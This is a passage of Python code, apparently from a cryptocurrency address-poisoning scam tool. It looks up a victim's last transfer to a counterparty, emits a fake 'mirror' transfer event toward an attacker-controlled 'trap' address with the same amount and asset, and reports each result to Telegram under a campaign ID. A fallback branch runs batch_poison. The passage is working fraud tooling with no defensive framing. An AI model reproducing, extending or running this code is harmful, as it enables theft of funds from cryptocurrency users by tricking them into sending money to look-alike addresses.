            error_msg = f"❌ Mirror failed: No counterparty found for {args.victim_address}"
            logger.error(error_msg)
            send_telegram(error_msg, campaign_id=campaign_id)
            if job_id:
                update_job(job_id, status='failed', message='No counterparty found')
            sys.exit(1)

        logger.info(f"[mirror] Fetching last transfer from {args.victim_address} to {counterparty}...")
        fetched_asset, fetched_amount = fetch_last_transfer_from_blockchain(args.victim_address, counterparty)

        if not fetched_asset or not fetched_amount:
            error_msg = f"❌ Mirror failed: No transfer found from {args.victim_address} to {counterparty}"
            logger.error(error_msg)
            send_telegram(error_msg, campaign_id=campaign_id)
            if job_id:
                update_job(job_id, status='failed', message='No transfer found')
            sys.exit(1)

        logger.info(f"[mirror] Last transfer: {fetched_amount} units of {fetched_asset}")

        # STEP 2: Emit FAKE mirror event (no real tokens needed)
        tx_hash = emit_mirror_transfer(args.victim_address, trap_address, fetched_amount, fetched_asset, campaign_id)

        if tx_hash:
            try:
                decimals = config.get_token_decimals().get(fetched_asset, 6) if hasattr(config, 'get_token_decimals') else 6
            except AttributeError:
                decimals = 18 if fetched_asset == NATIVE_SYMBOL else 6

            amount_display = fetched_amount / (10 ** decimals)
            success_msg = (
                f"🪞 Mirror event emitted!\n"
                f"Victim: {args.victim_address}\n"
                f"Trap: {trap_address}\n"
                f"Amount: {amount_display:.6f} {fetched_asset}\n"
                f"TX: {tx_hash}"
            )
            logger.info(success_msg)
            send_telegram(success_msg, campaign_id=campaign_id)
            if job_id:
                update_job(job_id, status='completed', progress=1, message='Mirror emitted')
        else:
            error_msg = f"❌ Mirror emission failed for {args.victim_address}"
            logger.error(error_msg)
            send_telegram(error_msg, campaign_id=campaign_id)
            if job_id:
                update_job(job_id, status='failed', message='Mirror emission failed')
            sys.exit(1)
    else:
        batch_poison(job_id=job_id, campaign_id=campaign_id)